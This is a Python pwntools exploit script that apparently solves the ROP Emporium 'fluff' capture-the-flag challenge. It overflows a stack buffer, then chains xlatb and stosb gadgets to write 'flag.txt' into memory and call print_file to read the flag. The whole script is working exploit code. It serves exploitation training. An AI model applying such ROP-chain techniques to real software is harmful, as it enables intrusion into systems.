import time

from pwn import *


EXECUTABLE = "./fluff"
context.binary = elf = ELF(EXECUTABLE)
lib_fluff = ELF("./libfluff.so")


p = process(EXECUTABLE)
if args.GDB:
    gdb.attach(p)


OFFSET = 40
if OFFSET is None:
    p.sendafter(b"> ", cyclic(128, alphabet=b"ABCDEFGHIJKLMNOPQRSTUVWXYZ"))

    time.sleep(1)
    core = Coredump("./core")
    seg_addr = int("0x" + hex(core.fault_addr)[10:], 16)
    log.success(f"Core fault address at: {hex(core.fault_addr)}")
    log.info(f"Finding offset for {hex(seg_addr)}")
    offset = cyclic_find(seg_addr, alphabet=b"ABCDEFGHIJKLMNOPQRSTUVWXYZ")
    log.success(f"Offset found: {offset}")
    exit()


rop = ROP(elf)


flag_addr = 0x601040

file_name = b"flag.txt"


char_lookup = {
    b"f": 0x4003c4, b"l": 0x4003c5, b"a": 0x4003d6, b"g": 0x4003cf,
    b".": 0x4003c9, b"t": 0x4003e0, b"x": 0x400246
}

payload  = b"A" * OFFSET

# Load string into memory

# Load rdi
payload += p64(rop.rdi.address) + p64(flag_addr)
# Set rax to 0
payload += p64(0x400610) + p64(0)
rax_value = 0
for i, c in enumerate(file_name):
    c = c.to_bytes(1, byteorder="little")
    # Load rbx
    payload += p64(0x40062a) + p64(0x4000) + p64(char_lookup[c] - rax_value - 0x3ef2)
    payload += p64(0x400628) # xlatb; ret;
    # store
    payload += p64(0x400639) # stosb byte ptr [rdi], al; ret;

    rax_value = ord(c)

# Load memory address into rdi
payload += p64(rop.rdi.address) + p64(flag_addr)
# Call print_file
payload += p64(elf.plt.print_file)


p.sendafter(b"> ", payload)
p.recvline()

flag = str(p.recvline(), "UTF-8")
log.success(f"Flag: {flag}")
